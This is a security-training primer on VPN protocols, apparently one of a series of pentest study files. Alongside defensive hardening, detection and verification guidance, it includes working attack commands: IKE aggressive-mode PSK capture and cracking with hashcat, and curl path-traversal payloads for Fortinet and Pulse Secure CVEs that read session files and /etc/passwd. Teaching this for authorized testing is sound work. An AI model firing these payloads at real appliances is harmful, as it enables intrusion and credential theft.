# VPN Fundamentals

Primer on the protocols that carry remote access: IPsec and IKE,
OpenVPN, WireGuard, and SSL VPNs. Covers the tunnel establishment,
authentication methods, and the configuration options that matter
for security (split tunneling, cipher suites, PFS). Read this first
if IKE, tunnel mode, or DPD are unfamiliar.

> [!CAUTION]
> This file is educational. The attacks that build on it (file 04)
> require written authorization. Merely connecting to a VPN you do
> not own may violate its acceptable-use policy or local law.

---

## 1. Overview

A VPN creates an encrypted tunnel between two endpoints. For remote
access, the tunnel runs from a client to a **VPN concentrator** (or
gateway) on the corporate edge. Inside the tunnel, the client
behaves as if it were on the corporate network.

Four main protocol families:

- **IPsec** (RFC 4301) - network-layer encryption. Two modes:
  transport (payload only) and tunnel (whole packet). Used for
  site-to-site and remote access (with IKEv2).
- **IKE** (RFC 7296) - Internet Key Exchange. Negotiates the IPsec
  Security Associations. Two phases: IKE_SA_INIT and IKE_AUTH
  (IKEv2). The legacy IKEv1 has Main Mode and Aggressive Mode.
- **OpenVPN** - userspace SSL/TLS-based VPN. Uses a custom protocol
  over UDP or TCP. Requires a client certificate or username/password.
- **WireGuard** - modern kernel-space VPN. Uses Noise protocol
  framework, Curve25519, ChaCha20-Poly1305. Very fast, small codebase.
- **SSL VPN** (also called "clientless VPN" or "web VPN") - vendor-
  specific (Cisco AnyConnect, Palo Alto GlobalProtect, Fortinet
  FortiClient, F5 BIG-IP APM). Uses TLS, sometimes with a browser
  plugin.

Plus Microsoft-specific:

- **SSTP** - PPP over HTTPS. Windows-native.
- **L2TP/IPsec** - L2TP tunnel inside IPsec. Deprecated in favor of
  IKEv2.
- **DirectAccess / Always On VPN** - Microsoft's always-on remote
  access. Uses IPsec and/or SSTP.

---

## 2. Reconnaissance / Enumeration

### 2.1 Identify the VPN technology

The UDP/TCP ports tell you a lot:

```text
UDP 500    IKE (IPsec)
UDP 4500   IKE NAT-T (IPsec)
UDP 1194   OpenVPN (default)
UDP 51820  WireGuard (default)
TCP 443    SSL VPN (AnyConnect, GlobalProtect, FortiClient), also OpenVPN over TCP
TCP 1723   PPTP (deprecated, insecure)
UDP 1701   L2TP
TCP 443    SSTP
```

### 2.2 Probe IKE (UDP 500)

```bash
# ike-scan sends IKE packets and reads responses
sudo ike-scan -M vpn.example.com

# Expected output (Main Mode):
#   vpn.example.com  500  Main Mode Handshake returned
#     HDR=(CKY-R=..., SA=(Enc=3DES Hash=SHA1 Auth=PSK Group=2:modp1024))
```

The `SA=` line reveals the supported transforms (encryption, hash,
authentication method, DH group).

### 2.3 Probe OpenVPN

```bash
# Send a probe packet and read the response
openvpn --remote vpn.example.com 1194 --proto udp --verb 3

# Or use nmap's openvpn service detection
nmap -sU -p 1194 --script openvpn-info vpn.example.com
```

OpenVPN responds with a `P_CONTROL_HARD_RESET_SERVER_V2` packet that
contains its version and configuration hints.

### 2.4 Probe WireGuard

```bash
# WireGuard is silent: it does not respond to unauthenticated packets
# Detection is difficult; look for the UDP port in firewall rules
nmap -sU -p 51820 vpn.example.com
# open|filtered = likely WireGuard (no response is normal)
```

WireGuard does not respond to probes, making it hard to fingerprint.
This is by design.

### 2.5 Fingerprint SSL VPN

```bash
# HTTPS probe
curl -skI https://vpn.example.com/ | head -20

# Look for vendor-specific headers or paths:
#   Cisco AnyConnect: /+CSCOE+/
#   Palo Alto GlobalProtect: /global-protect/login.esp
#   Fortinet FortiClient: /remote/login
#   F5 BIG-IP: /my.policy
```

### 2.6 Identify the VPN vendor from the certificate

```bash
openssl s_client -connect vpn.example.com:443 -showcerts </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer
```

Expected output (Cisco):

```text
subject=CN=vpn.example.com,O=Example Corp
issuer=C=US,ST=California,L=San Jose,O=Cisco Systems, Inc.,CN=Cisco Manufacturing CA
```

The issuer often names the vendor (Cisco, Palo Alto, Fortinet, F5).

---

## 3. Common Attack Vectors

### 3.1 IKE aggressive mode PSK cracking

IKEv1 Aggressive Mode transmits the PSK-derived hash in cleartext
(offline crackable). Main Mode does not.

**Precondition:** the VPN uses IKEv1 Aggressive Mode with PSK.

**Impact:** PSK recovery, full VPN access.

### 3.2 VPN appliance CVE exploitation

VPN appliances have a history of critical CVEs:

- **Cisco ASA / AnyConnect**: CVE-2020-3452 (path traversal),
  CVE-2023-20269 (unauthorized access).
- **Palo Alto GlobalProtect**: CVE-2019-1579 (pre-auth RCE),
  CVE-2024-3400 (command injection).
- **Fortinet FortiOS**: CVE-2018-13379 (path traversal),
  CVE-2022-42475 (heap overflow).
- **Citrix NetScaler**: CVE-2019-19781 (path traversal),
  CVE-2023-3519 (pre-auth RCE).
- **Ivanti Connect Secure**: CVE-2023-46805, CVE-2024-21887
  (auth bypass + command injection).

**Precondition:** unpatched appliance exposed to the internet.

**Impact:** pre-auth RCE, credential theft, full network access.

### 3.3 Credential brute force

VPN endpoints often allow unlimited authentication attempts. A slow
spray can recover credentials without triggering lockout.

### 3.4 MFA bypass

Some VPNs allow "remember this device" tokens that bypass MFA for
30-90 days. If a token is stolen, MFA is bypassed.

### 3.5 Split tunneling abuse

If split tunneling is enabled, the client sends corporate traffic
through the VPN but general internet traffic directly. An attacker
with local access to the client can intercept the direct traffic,
or use the client to pivot into the corporate network via the
tunnel.

### 3.6 VPN session hijacking

If the session token is not bound to the device (IP, certificate),
an attacker who steals the token can reuse it.

### 3.7 SSL VPN web interface attacks

The web login page is a web application. SQL injection, XSS, CSRF,
and authentication bypass apply. Vendor-specific paths are often
poorly tested.

---

## 4. Exploitation Recipes

### 4.1 IKE aggressive mode detection with ike-scan

```bash
# Try Main Mode first (default)
sudo ike-scan -M vpn.example.com

# If no response, try Aggressive Mode
sudo ike-scan -A vpn.example.com
```

Expected output (Aggressive Mode vulnerable):

```text
vpn.example.com  500  Aggressive Mode Handshake returned
    HDR=(CKY-R=..., SA=(Enc=3DES Hash=SHA1 Auth=PSK Group=2:modp1024))
    VID=...
    KEY=(...)
    ID(Type=ID_USER_FQDN, Value=vpn.example.com)
```

The `KEY=` field is the crackable PSK hash.

### 4.2 Crack IKE aggressive mode PSK

```bash
# Save the hash
sudo ike-scan -A -P handshake.txt vpn.example.com

# Crack with psk-crack
psk-crack -d /usr/share/wordlists/rockyou.txt handshake.txt
```

Or convert to hashcat format:

```bash
# hashcat mode 5300 (IKEv1 PSK)
hashcat -m 5300 handshake.txt /usr/share/wordlists/rockyou.txt
```

### 4.3 OpenVPN configuration extraction

```bash
# Extract the OpenVPN configuration from a client profile
# The .ovpn file contains the CA cert, client cert, and client key
# If the key is not password-protected, the config is reusable

grep -A 100 "<key>" client.ovpn | head -50
```

### 4.4 OpenVPN user enumeration

```bash
# Some OpenVPN servers with username/password auth respond differently
# to valid and invalid usernames. Test with:
openvpn --config test.ovpn --auth-user-pass <(echo -e "user\npass")

# Response time or error message differences reveal valid users
```

### 4.5 Cisco AnyConnect / GlobalProtect detection

```bash
# Cisco AnyConnect
curl -sk https://vpn.example.com/+CSCOE+/logon.html

# Palo Alto GlobalProtect
curl -sk https://vpn.example.com/global-protect/login.esp

# Fortinet FortiClient
curl -sk https://vpn.example.com/remote/login

# F5 BIG-IP
curl -sk https://vpn.example.com/my.policy
```

Each responds with a vendor-specific HTML page or redirect.

### 4.6 Vendor CVE exploitation (lab)

```bash
# Example: CVE-2018-13379 (Fortinet FortiOS path traversal)
curl -sk "https://vpn.example.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Example: CVE-2019-11510 (Pulse Secure arbitrary file read)
curl -sk "https://vpn.example.com/dana-na/../dana/html5acc/guacamole/../../../../../../../../etc/passwd?/dana/html5acc/guacamole/"

# These MUST be run only against systems you own or have
# written authorization to test.
```

---

## 5. Post-Exploitation

After VPN credential recovery:

- **Connect to the VPN** and access the internal network.
- **Enumerate internal services** as if you were on-site.
- **Pivot to other systems** (VPN clients often have broad access).
- **Steal additional credentials** from the internal network.

After VPN appliance compromise (RCE):

- **Persistence** via scheduled tasks, web shells, or modified
  firmware.
- **Credential harvesting** from the appliance's config (PSKs,
  certificates, cached credentials).
- **Lateral movement** to the internal network.

After split tunneling abuse:

- **Intercept the direct traffic** if the attacker is on the same
  local network as the client.
- **Use the client as a pivot** into the corporate network via the
  active VPN tunnel.

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High to Critical |
| Preconditions | Access to the VPN endpoint (usually internet-facing) |
| Detectability | Medium - logs, MFA prompts, anomaly detection |
| Business impact | Network access, credential theft, lateral movement |

VPN concentrators are **edge services**: internet-facing,
authentication-terminating, and often a single point of failure for
remote work. A compromised VPN is equivalent to physical presence
on the corporate network.

---

## 7. Root Causes (AppSec)

- IKEv1 Aggressive Mode with PSK (offline crackable).
- Weak PSK or pre-shared key reused across sites.
- VPN appliance unpatched (critical CVEs).
- MFA not enforced, or MFA bypass tokens with long lifetimes.
- Split tunneling enabled without endpoint security controls.
- Session tokens not bound to the device.
- Web login interface with web vulnerabilities (SQLi, XSS, auth
  bypass).
- Credential sharing between users.

---

## 8. Preventive Controls (AppSec)

### 8.1 Use IKEv2 (not IKEv1 Aggressive Mode)

- IKEv2 with certificate authentication is the modern standard.
- If PSK must be used, use IKEv2 Main Mode (not Aggressive Mode).
- Disable IKEv1 Aggressive Mode entirely.

```text
# StrongSwan: disable aggressive mode
# In ipsec.conf:
#   aggressive=no
```

### 8.2 Use certificate authentication

- EAP-TLS or RSA certificates instead of PSK.
- Client certificates stored in TPM/smart card.
- Server certificate validated by clients (CA distributed).

### 8.3 Enforce MFA

- TOTP, push, or FIDO2 for all VPN users.
- Limit "remember this device" to 7-30 days maximum.
- No MFA bypass without endpoint compliance check.

### 8.4 Patch VPN appliances monthly

Subscribe to vendor security advisories. Apply patches within 24-48
hours of release.

- Cisco: https://sec.cloudapps.cisco.com/security/center/publicationListing.x
- Palo Alto: https://security.paloaltonetworks.com/
- Fortinet: https://www.fortiguard.com/psirt
- Ivanti: https://forums.ivanti.com/s/global-search/security-advisories

### 8.5 Disable split tunneling (or secure it)

- Full tunnel: all traffic goes through the VPN. Slower but safer.
- If split tunneling is required, pair it with endpoint security
  (EDR, host firewall) and a policy that blocks corporate access
  from unmanaged devices.

### 8.6 Bind sessions to devices

- Use client certificates (not just username/password).
- Bind the session token to the certificate or device fingerprint.
- Short session lifetimes (8-12 hours).

### 8.7 Harden the web interface

- WAF in front of the VPN web portal.
- Rate limit authentication attempts.
- Disable unnecessary endpoints.
- Keep the appliance firmware updated.

### 8.8 Network segmentation

- VPN clients land in a dedicated VLAN with firewall rules.
- Least-privilege access: only the resources the user needs.
- No direct access to the management network.

### 8.9 Logging and monitoring

- Log all VPN authentications (success and failure).
- Alert on authentication from new geographies.
- Alert on MFA failures.
- Alert on unusual session lengths or data volumes.

---

## 9. Detection Controls (AppSec)

### 9.1 VPN authentication anomalies

- Login from a new country or ASN.
- Login outside business hours.
- Login from a known-bad IP (threat intel).
- Rapid succession of failed logins (brute force).
- Successful login after many failures (credential stuffing).

### 9.2 Session anomalies

- Unusually long sessions.
- Large data transfers (possible exfiltration).
- Concurrent sessions from different geographies.

### 9.3 Appliance-specific

- Vendor IDS/IPS signatures for known CVEs.
- File integrity monitoring on the appliance (modified files,
  web shells).
- WAF alerts on the web portal.

### 9.4 SIEM rules

- Alert on VPN login from a new country for a user.
- Alert on > 5 failed VPN logins per user per 5 minutes.
- Alert on VPN login outside the user's normal hours.
- Alert on session token reuse from a different IP.

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **IKEv1 Aggressive Mode:** run `ike-scan -A` against the VPN.
   Should not respond.
2. **MFA:** attempt VPN login with valid credentials but no MFA.
   Should fail.
3. **Split tunneling:** check the client routing table after
   connecting. Should show only the corporate network, not the
   default route.
4. **Session binding:** copy a session token to another machine.
   Should be rejected.
5. **Patching:** check the appliance firmware version against the
   vendor's latest advisory.
6. **Web interface:** run a web vulnerability scan against the
   portal. Should not find SQLi, XSS, or auth bypass.

---

## 11. OSCP Notes

VPN protocols are **not** in the OSCP exam. They are relevant for:

- Real internal engagements where VPN is the access path.
- Red team operations targeting remote workers.
- PEN-200 covers tunneling but not VPN appliance exploitation.

For the report, document:

- The VPN technology and version.
- The attack path (IKE aggressive, credential spray, CVE
  exploitation).
- The defensive control (IKEv2, MFA, patching, session binding).

---

## 12. Production Notes

- **VPN appliances are high-value targets.** They are exposed to
  the internet, terminate authentication, and often have broad
  network access. Prioritize patching.
- **IKEv1 Aggressive Mode with PSK is a critical finding.** Even
  without cracking the PSK, the fact that it is enabled is a
  finding.
- **Split tunneling is a trade-off.** Full tunnel is slower but
  safer. If split tunneling is required, pair it with EDR and
  policy enforcement.
- **MFA is table stakes.** Without it, credential theft is trivial.
  With it, the attacker needs to also bypass MFA (phishing proxy,
  MFA fatigue, or session token theft).
- **Session tokens are as valuable as passwords.** Treat them as
  credentials. Short lifetimes, device binding, and monitoring.
- **VPN appliance CVEs are exploited within days** of release.
  Subscribe to advisories and patch fast.
- **Do not test VPN CVEs on production systems.** A failed exploit
  can crash the appliance and disconnect all remote workers.

---

## 13. References

- RFC 4301 - Security Architecture for the Internet Protocol
- RFC 7296 - Internet Key Exchange Protocol Version 2 (IKEv2)
- RFC 5996 - IKEv2 (superseded by 7296)
- OpenVPN Protocol documentation
- [WireGuard whitepaper](https://www.wireguard.com/papers/wireguard.pdf)
- [ike-scan](https://github.com/royhills/ike-scan) - IKE scanner
- [StrongSwan](https://www.strongswan.org/) - open-source IPsec/IKEv2
- [OpenVPN](https://openvpn.net/) - open-source SSL VPN
- [MITRE ATT&CK T1133 - External Remote Services](https://attack.mitre.org/techniques/T1133/)
- NIST SP 800-77 - Guide to IPsec VPNs
- NIST SP 800-113 - Guide to SSL VPNs
- NSA - "Selecting and Hardening Remote Access VPNs"
- `man ike-scan`, `man openvpn`, `man wg`